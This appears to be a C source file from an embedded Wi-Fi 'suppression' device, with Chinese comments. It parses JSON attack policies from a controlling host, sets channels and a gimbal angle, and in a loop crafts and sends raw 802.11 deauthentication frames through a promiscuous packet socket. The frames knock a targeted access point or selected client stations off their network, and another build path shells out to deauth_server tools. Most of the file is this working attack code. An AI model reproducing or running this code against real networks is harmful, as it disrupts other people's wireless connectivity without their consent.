#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netpacket/packet.h>
#include <net/if.h>
#include <fcntl.h>
#include "common.h"
#include "mac80211_atk.h"
#include "mac80211_fmt.h"
#include <netinet/in.h>
#include "wifi_access.h"
#include "script.h"
#include "wifi_sniffer.h"
#include "DataProcess.h"
// #include <sys/utsname.h>
// #include <sys/wait.h>
// #include <sys/time.h>
// #include <sys/stat.h>
// #include <netinet/in.h>
// #include <netinet/in_systm.h>
// #include <netinet/ip.h>
// #include <netinet/tcp.h>
// #include <netinet/in.h>
// #include <net/if_arp.h>
// #include <arpa/inet.h>
// #include <linux/if_ether.h>
// #include <linux/if.h>
// #include <linux/wireless.h>
// #include <linux/if_tun.h>
// #include <linux/rtc.h>
// #include <dirent.h>
// #include <signal.h>

/***********************************************************************************
 *                                  Declare
 ***********************************************************************************/

/***********************************************************************************
 *                                  Variable
 ***********************************************************************************/
bool ApInter = false;
bool StaInter = false;
struct Atk_Info AtkInfo;
/*****************************************************************
 * 函数描述：开启ap广播压制线程
 * 参数：	   无
 * 返回值： 无
 * ***************************************************************/
void start_ap_inter(void)
{
	ApInter = true;
    printf("start to ApInter\n");
}
/*****************************************************************
 * 函数描述：关闭ap广播压制线程
 * 参数：	   无
 * 返回值： 无
 * ***************************************************************/
void stop_ap_inter(void)
{
	ApInter = false;
#ifdef ZRRJ
	system("deauth_server stop");
#endif
    usleep(100000);
}
/*****************************************************************
 * 函数描述：开启sta压制线程
 * 参数：	   无
 * 返回值： 无
 * ***************************************************************/
void start_sta_inter(void)
{
	StaInter = true;
    printf("start to StaInter\n");
}
/*****************************************************************
 * 函数描述：关闭sta压制线程
 * 参数：	   无
 * 返回值： 无
 * ***************************************************************/
void stop_sta_inter(void)
{
	StaInter = false;
#ifdef ZRRJ
	if(AtkInfo.taget == ATK_TAGET_STA){
		printf("deauth_multi_server stop\n");
		system("deauth_multi_server stop");
	}
	else{
		system("deauth_server stop");
	}
#endif
    usleep(100000);
}


/*****************************************************************
 * 函数描述：压制、干扰策略解析函数，用于解析上位机发下来的策略并执行
 * 参数：	   cJSON* param_ap ap 信息json字串
 * 		   cJSON* param_sta sta信息json字串
 * 返回值： 解析结果  -1 错误
 * 					0 解析成功
 * ***************************************************************/
int wifi_atkpolicy_parse(cJSON* param_ap,cJSON* param_sta)
{
	char cmd[64];
	uint8_t ucchl=0;
    if (param_ap == NULL){
    	AtkInfo.taget = ATK_TAGET_NONE;
    	printf ("param_ap==NULL or param_sta==NULL\n");
    	return -1;
    }
    if(param_sta != NULL){
    	AtkInfo.taget = ATK_TAGET_STA;
    }
    else{
    	AtkInfo.taget = ATK_TAGET_AP;
    }
    cJSON *angobj=cJSON_GetObjectItem(param_ap, "Angle");
    if(angobj == NULL){
    	printf("no angle obj\n");
    	return -1;
    }
    AtkInfo.angle = cJSON_GetObjectItem(param_ap, "Angle")->valueint;
	if(AtkInfo.angle <MIN_ANGLE){
		AtkInfo.angle=MIN_ANGLE;
	}
	else if(AtkInfo.angle >MAX_ANGLE){
		AtkInfo.angle=MAX_ANGLE;
	}
	printf ("angle:%d\n", AtkInfo.angle);
    cJSON* ch = cJSON_GetObjectItem(param_ap, "ch");//获取信道
    if (ch == NULL){
    	printf ("channel==NULL\n");
    	return -1;
    }
    AtkInfo.channel = atoi((const char *)ch->valuestring);

#ifdef WSPY_CAR //设置前端的角度和信道
    if(AtkInfo.channel>14){
    	ucchl=NET5G8MAJIDX;
    }
    else{
    	ucchl=NET2G4MAJIDX;
    }
    gimbal_set_angle(AtkInfo.angle);
#else
	gimbal_set_angle(AtkInfo.angle,AtkInfo.channel);
#endif
    cJSON* ap_mac = cJSON_GetObjectItem(param_ap, "mac");//获取ap mac地址
	if (ap_mac == NULL){
		printf ("ap_mac==NULL\n");
		return -2;
	}
	printf("atk mac %s\n",ap_mac->valuestring);
#ifndef ZRRJ
	getmac(ap_mac->valuestring, 1, AtkInfo.ap_mac);
#else
	strcpy(AtkInfo.ap_mac,ap_mac->valuestring);
	printf("atk ap mac %s\n",AtkInfo.ap_mac);
#endif
#ifndef MUL_GR
	if(AtkInfo.taget == ATK_TAGET_STA){
		cJSON* sta_mac = cJSON_GetObjectItem(param_sta, "mac");
		if (sta_mac == NULL){
			printf ("sta_mac==NULL\n");
			return -2;
		}
#ifndef ZRRJ
		getmac(sta_mac->valuestring, 1, AtkInfo.sta_mac);
		memcpy(WifiAccess.sta_mac,AtkInfo.sta_mac,6);
#else
		getmac(sta_mac->valuestring, 1, WifiAccess.sta_mac);
		strcpy(AtkInfo.sta_mac,sta_mac->valuestring);
#endif
	//	memset(AtkInfo.sta_mac,0xff,6);
	}
#else
	if(AtkInfo.taget == ATK_TAGET_STA){
			cJSON* sta_mac = cJSON_GetObjectItem(param_sta, "mac");
			int size = cJSON_GetArraySize(sta_mac);
			if(size >MAX_GZ_NUM){
				size=MAX_GZ_NUM;
			}
			AtkInfo.sta_num=size;
			cJSON* array_item;
			for (int i=0;i<size;i++){
				array_item = cJSON_GetArrayItem(sta_mac, i);
				if (array_item != NULL){
					getmac(array_item->valuestring, 1, WifiAccess.sta_mac);
					strcpy(AtkInfo.sta_mac[i],array_item->valuestring);
				}
			}
	}
#endif
	cJSON* band = cJSON_GetObjectItem(param_ap, "band");
	if(band == NULL){
		printf ("band==NULL\n");
		return -2;
	}
	memset(cmd, 0, sizeof(cmd));
	if(strcmp(band->valuestring,"2.4")==0){ //设置攻击网卡和信道
		AtkInfo.band =ATK24DEVCHL;
		snprintf(cmd, sizeof(cmd),"uci set wireless.@wifi-device[%d].channel=%d", ATK24DEVCHL,  AtkInfo.channel);
	}
	else if(strcmp(band->valuestring,"5.8")==0){
		snprintf(cmd, sizeof(cmd),"uci set wireless.@wifi-device[%d].channel=%d", ATK58DEVCHL,  AtkInfo.channel);
		AtkInfo.band =ATK58DEVCHL;
	}
	else{
		return -3;
	}
	printf("%s\n",cmd);
#ifndef ZRRJ
	system(cmd);
	system("uci commit wireless");
#else
	memset(cmd, 0, sizeof(cmd));
	snprintf(cmd, sizeof(cmd),"iwconfig %s channel %d", UserCfgJson.wlan_dev[AtkInfo.band],  AtkInfo.channel);
	system(cmd);
#endif
    return 0;
}
/***********************************************************************************
 *                                  Function
 ***********************************************************************************/





#include <getopt.h>

/*****************************************************************
* 函数描述：字符转数值函数，用于将字符转换为数值
* 参数：	  unsigned char  字符
* 返回值： int  数值
****************************************************************/
int hexCharToInt(unsigned char c)
{
	static int table_created = 0;
	static int table[256];

	int i;

	if (table_created == 0)
	{
		/*
		 * It may seem a bit long to calculate the table
		 * but character position depend on the charset used
		 * Example: EBCDIC
		 * but it's only done once and then conversion will be really fast
		 */
		for (i=0; i < 256; i++)
		{

			switch ((unsigned char)i)
			{
				case '0':
					table[i] = 0;
					break;
				case '1':
					table[i] = 1;
					break;
				case '2':
					table[i] = 2;
					break;
				case '3':
					table[i] = 3;
					break;
				case '4':
					table[i] = 4;
					break;
				case '5':
					table[i] = 5;
					break;
				case '6':
					table[i] = 6;
					break;
				case '7':
					table[i] = 7;
					break;
				case '8':
					table[i] = 8;
					break;
				case '9':
					table[i] = 9;
					break;
				case 'A':
				case 'a':
					table[i] = 10;
					break;
				case 'B':
				case 'b':
					table[i] = 11;
					break;
				case 'C':
				case 'c':
					table[i] = 12;
					break;
				case 'D':
				case 'd':
					table[i] = 13;
					break;
				case 'E':
				case 'e':
					table[i] = 14;
					break;
				case 'F':
				case 'f':
					table[i] = 15;
					break;
				default:
					table[i] = -1;
			}
		}

		table_created = 1;
	}

	return table[c];
}
/*****************************************************************
* 函数描述：mac格式转换函数
* 参数：	  char * macAddress
*		  int strict 检查mac个数参数
*		  unsigned char * mac 输出的mac数值
* 返回值：  无
****************************************************************/
int getmac(char * macAddress_src, int strict, unsigned char * mac)
{
	char byte[3];
	int i, nbElem, n;

	char macAddress[32];
	strcpy(macAddress,macAddress_src);
	if (macAddress == NULL)//是否为空指针
		return 1;

	/* Minimum length */
	if ((int)strlen(macAddress) < 12)//最小长度
		return 1;

	memset(mac, 0, 6);
	byte[2] = 0;
	i = nbElem = 0;

	while (macAddress[i] != 0)
	{
		if (macAddress[i] == '\n' || macAddress[i] == '\r')
			break;

		byte[0] = macAddress[i];
		byte[1] = macAddress[i+1];

		if (sscanf( byte, "%x", &n ) != 1
			&& strlen(byte) == 2)
			return 1;

		if (hexCharToInt(byte[1]) < 0)
			return 1;

		mac[nbElem] = n;

		i+=2;
		nbElem++;

		if (macAddress[i] == ':' || macAddress[i] == '-'  || macAddress[i] == '_')
			i++;
	}

	if ((strict && nbElem != 6)
		|| (!strict && nbElem > 6))
		return 1;

	return 0;
}
#ifdef ZRRJ
/*****************************************************************
* 函数描述：deauth攻击包发送线程回调处理函数，用于发送deauth数据包
* 参数：	   void *argv 发包参数
* 返回值： 无
****************************************************************/
void *do_deauth_atk(void *argv)
{
	int timecount=0;
	int send_time = 0;
	uint8_t ucchl=0;
	char cmd[128], cbuf[200],cdev[20];

	if(argv  == NULL){
		send_time =50;
	}
	else{
		send_time=300;
	}
	if(AtkInfo.band == ATK24DEVCHL){
		ucchl=0;
	}
	else{
		ucchl=1;
	}
	if(WifiAccess.mode == ACCESS_MODE_AP){
		while(1){
			sprintf(cmd,"pseudo_ap_server status");
			system(cmd);
			memset(cmd,0,sizeof(cmd));
			sleep(1);
			sys_get("cat /tmp/pseudo_ap_server.res",cbuf,20);
			if(strstr(cbuf,"0302") == NULL)
			{
				timecount++;
				printf("%s\n",cbuf);
				sleep(3);
				if(timecount >10){
					printf("wait ap time out\n");
					break;
				}
			}
			else
			{
				printf("%s\n",cbuf);
				break;
			}
			memset(cbuf,0,sizeof(cbuf));
		}
	}
	strcpy(cdev,UserCfgJson.wlan_dev[AtkInfo.band]);

	printf("%s %d\n",UserCfgJson.wlan_dev[AtkInfo.band],AtkInfo.band);
	if(AtkInfo.taget == ATK_TAGET_STA){
#ifndef MUL_GR
	//	sprintf(cmd,"deauth_server %s %d %d %s %s %d %d",cdev,AtkInfo.channel,1-ucchl,AtkInfo.sta_mac,AtkInfo.ap_mac,1,100);
		sprintf(cmd,"deauth_server %s %d %s %s %d",cdev,0,AtkInfo.sta_mac,AtkInfo.ap_mac,send_time);
#else

		switch(AtkInfo.sta_num){
			case 1:	sprintf(cmd,"deauth_multi_server %s %d %s %s 0 0 0 %d >/dev/null",cdev,0,AtkInfo.ap_mac,AtkInfo.sta_mac[0],100);break;
			case 2:	sprintf(cmd,"deauth_multi_server %s %d %s %s %s 0 0 %d >/dev/null",cdev,0,AtkInfo.ap_mac,AtkInfo.sta_mac[0],AtkInfo.sta_mac[1],100);break;
			case 3:	sprintf(cmd,"deauth_multi_server %s %d %s %s %s %s 0 %d >/dev/null",cdev,0,AtkInfo.ap_mac,AtkInfo.sta_mac[0],AtkInfo.sta_mac[1],AtkInfo.sta_mac[2],100);break;
			case 4:	sprintf(cmd,"deauth_multi_server %s %d %s %s %s %s %s %d >/dev/null",cdev,0,AtkInfo.ap_mac,AtkInfo.sta_mac[0],AtkInfo.sta_mac[1],AtkInfo.sta_mac[2],AtkInfo.sta_mac[3],100);break;
			default:sprintf(cmd,"deauth_multi_server %s %d %s %s %d >/dev/null",cdev,0,AtkInfo.sta_mac[0],AtkInfo.ap_mac,100);break;
		}
#endif
	}
	else{
		sprintf(cmd,"deauth_server %s %d %s FF-FF-FF-FF-FF-FF %d",cdev,0,AtkInfo.ap_mac,send_time);
	}
	printf("%s\n",cmd);
	system(cmd);
	return NULL;
}
#else
/*****************************************************************
* 函数描述：deauth攻击包发送线程回调处理函数，用于发送deauth数据包
* 参数：	   void *argv 发包参数
* 返回值： 无
****************************************************************/
void *do_deauth_atk(void *argv)
{
	char cmd[128], cbuf[200],cdev[20];
	struct ifreq ifr;
	struct packet_mreq mr;
	struct sockaddr_ll sll;
	struct DC_device dev;
	int balsend = 0;
	uint8_t u8aRadiotap[] = {
		0x00, 0x00, 			// <-- radiotap version
		0x0c, 0x00, 			// <- radiotap header length
		0x04, 0x80, 0x00, 0x00, // <-- bitmap
		0x00, 					// <-- rate
		0x00, 					// <-- padding for natural alignment
		0x18, 0x00, 			// <-- TX flags
	};

	uint8_t deauth_pkt[30] =
	{
		0xc0, 0x00,
		0x3a, 0x01,
		0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc,
		0xbb, 0xbb, 0xbb, 0xbb, 0xbb, 0xbb,
		0xbb, 0xbb, 0xbb, 0xbb, 0xbb, 0xbb,
		0x00, 0x00,
		0x70, 0x00
	};

	unsigned char sendbuf[128];
	unsigned long send_pkt_num = 0;

	int  count, ret;

    memset( &cmd, 0, sizeof( cmd) );
    memset( &dev, 0, sizeof( dev ) );
    if(argv  == NULL){
    	balsend =1;
    }


//    sprintf(cbuf,"uci get wspy.wlan.dev%d",AtkInfo.band);//获取设备名称
//    sys_get(cbuf,cdev,WDEVNAME_LEN);
    strcpy(cdev,UserCfgJson.wlan_dev[AtkInfo.band]);
	dev.rate = 0x0c; /* default to 1Mbps if nothing is set
		  2 1M
		  0xc 6M*/
	dev.iface_len = strlen(cdev);
	sprintf (dev.iface, "%.*s", dev.iface_len, cdev);
	printf("%s  %d \n",dev.iface,AtkInfo.band);

	getmac(AtkInfo.ap_mac, 1, dev.s_bssid);
//	printf("%#02x,%#02x,%#02x,%#02x,%#02x,%#02x\n",dev.s_bssid[0],dev.s_bssid[1],dev.s_bssid[2],
//			dev.s_bssid[3],dev.s_bssid[4],dev.s_bssid[5]);

	if (( dev.fd_out = socket( PF_PACKET, SOCK_RAW,
                               htons( ETH_P_ALL ) ) ) < 0 )
    {
        printf( "socket(PF_PACKET) failed\n" );
    }

	memset (&ifr, 0, sizeof (ifr));
	strncpy (ifr.ifr_name, dev.iface, dev.iface_len);

    if( ioctl( dev.fd_out, SIOCGIFINDEX, &ifr ) < 0 )
    {
        printf("Interface %s: \n", dev.iface);
        perror( "ioctl(SIOCGIFINDEX) failed" );
        return NULL;
    }

    memset( &sll, 0, sizeof( sll ) );
    sll.sll_family   = AF_PACKET;
    sll.sll_ifindex  = ifr.ifr_ifindex;

    sll.sll_protocol = htons( ETH_P_ALL );

    /* bind the raw socket to the interface */
    if( bind( dev.fd_out, (struct sockaddr *) &sll,
              sizeof( sll ) ) < 0 )
    {
        printf("Interface %s: \n", dev.iface);
        perror( "bind(ETH_P_ALL) failed" );
        return NULL;
    }

    /* enable promiscuous mode */

    memset( &mr, 0, sizeof( mr ) );
    mr.mr_ifindex = sll.sll_ifindex;
    mr.mr_type = PACKET_MR_PROMISC;

    if( setsockopt( dev.fd_out, SOL_PACKET, PACKET_ADD_MEMBERSHIP,
                    &mr, sizeof( mr ) ) < 0 )
    {
    	printf( "setsockopt(PACKET_MR_PROMISC) failed\n" );
        return NULL;
    }

	if(AtkInfo.taget == ATK_TAGET_STA){
		getmac(AtkInfo.sta_mac, 1, dev.a_bssid);
	    memcpy( deauth_pkt +  4, dev.a_bssid,   6 );
	}
	else
	    memcpy( deauth_pkt +  4, BROADCAST,   6 );

    memcpy( deauth_pkt + 10, dev.s_bssid, 6 );
    memcpy( deauth_pkt + 16, dev.s_bssid, 6 );

	deauth_pkt[22] = (send_pkt_num & 0x0000000F) << 4;
	deauth_pkt[23] = (send_pkt_num & 0x00000FF0) >> 4;

	count = 26;
	u8aRadiotap[8] = dev.rate;

	memcpy(sendbuf, u8aRadiotap, sizeof (u8aRadiotap) );
	memcpy(sendbuf + sizeof (u8aRadiotap), deauth_pkt, count);
	count += sizeof (u8aRadiotap);

	printf ("sendbuf count=%d\n",count);
	for (int i=0; i<count; i++){
		printf ("%02x ", sendbuf[i]);
	}
	printf ("\n");

	while (ApInter == true || StaInter==true)
	{
		if(balsend ==1){
			usleep (20000);
		}else{
			usleep(100000);
		}
//		usleep (100000);

		ret = write (dev.fd_out, sendbuf, count);
		if( ret < 0 )
		{
			perror( "write failed" );
			return NULL;
		}

		send_pkt_num++;
//		if(balsend == 0&&send_pkt_num>=sendcount){
//			sleep(5);
//			send_pkt_num=0;
//		}
//		if ((send_pkt_num % 10) == 0)
//			printf("sendnum %ld\n",send_pkt_num);
	}
	return NULL;
}
#endif

